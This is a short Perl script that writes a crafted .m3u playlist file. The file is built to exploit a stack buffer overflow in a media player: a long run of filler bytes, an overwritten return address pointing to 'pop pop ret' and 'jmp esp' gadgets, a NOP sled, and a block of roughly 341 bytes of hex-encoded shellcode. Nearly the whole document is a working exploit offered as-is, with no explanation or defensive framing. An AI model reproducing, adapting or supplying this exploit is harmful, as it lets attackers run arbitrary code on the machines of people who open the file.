my $file= "test1.m3u";
my $junk="\x41" x 26081;
my $eip= pack('V', 0x1002d619); # pop pop ret
my $jmpesp=pack('V', 0x7e45b310); # jmp esp
my $prependesp = "XX";
my $shellcode = "\x90" x 8;
my $padding = "\x90" x 30;
$shellcode = $shellcode . $jmpesp . $padding;
# 341
$shellcode =  $shellcode .
"\xb8\xab\xad\x6e\xe7\xdd\xc2\xd9\x74\x24\xf4\x5e\x31\xc9" .
"\xb1\x4f\x83\xee\xfc\x31\x46\x10\x03\x46\x10\x49\x58\x92" .
"\x0f\x04\xa3\x6b\xd0\x76\x2d\x8e\xe1\xa4\x49\xda\x50\x78" .
"\x19\x8e\x58\xf3\x4f\x3b\xea\x71\x58\x4c\x5b\x3f\xbe\x63" .
"\x5c\x8e\x7e\x2f\x9e\x91\x02\x32\xf3\x71\x3a\xfd\x06\x70" .
"\x7b\xe0\xe9\x20\xd4\x6e\x5b\xd4\x51\x32\x60\xd5\xb5\x38" .
"\xd8\xad\xb0\xff\xad\x07\xba\x2f\x1d\x1c\xf4\xd7\x15\x7a" .
"\x25\xe9\xfa\x99\x19\xa0\x77\x69\xe9\x33\x5e\xa0\x12\x02" .
"\x9e\x6e\x2d\xaa\x13\x6f\x69\x0d\xcc\x1a\x81\x6d\x71\x1c" .
"\x52\x0f\xad\xa9\x47\xb7\x26\x09\xac\x49\xea\xcf\x27\x45" .
"\x47\x84\x60\x4a\x56\x49\x1b\x76\xd3\x6c\xcc\xfe\xa7\x4a" .
"\xc8\x5b\x73\xf3\x49\x06\xd2\x0c\x89\xee\x8b\xa8\xc1\x1d" .
"\xdf\xca\x8b\x49\x2c\xe0\x33\x8a\x3a\x73\x47\xb8\xe5\x2f" .
"\xcf\xf0\x6e\xe9\x08\xf6\x44\x4d\x86\x09\x67\xad\x8e\xcd" .
"\x33\xfd\xb8\xe4\x3b\x96\x38\x08\xee\x38\x69\xa6\x41\xf8" .
"\xd9\x06\x32\x90\x33\x89\x6d\x80\x3b\x43\x18\x87\xac\xac" .
"\xb3\x64\x4b\x45\xc6\x6a\x82\xc9\x4f\x8c\xce\xe1\x19\x07" .
"\x67\x9b\x03\xd3\x16\x64\x9e\x73\xba\xf7\x45\x83\xb5\xeb" .
"\xd1\xd4\x92\xda\x2b\xb0\x0e\x44\x82\xa6\xd2\x10\xed\x62" .
"\x09\xe1\xf0\x6b\xdc\x5d\xd7\x7b\x18\x5d\x53\x2f\xf4\x08" .
"\x0d\x99\xb2\xe2\xff\x73\x6d\x58\x56\x13\xe8\x92\x69\x65" .
"\xf5\xfe\x1f\x89\x44\x57\x66\xb6\x69\x3f\x6e\xcf\x97\xdf" .
"\x91\x1a\x1c\xef\xdb\x06\x35\x78\x82\xd3\x07\xe5\x35\x0e" .
"\x4b\x10\xb6\xba\x34\xe7\xa6\xcf\x31\xa3\x60\x3c\x48\xbc" .
"\x04\x42\xff\xbd\x0c";

open($FILE, ">$file");
my $data = "$junk.$eip.$prependesp.$shellcode" . "\x41" x (30000 - 26801 - 4 - 2 - 8 - 4 - 30 - 341);
print $FILE $data;
close($FILE);
print "m3u File Created successfully\n";
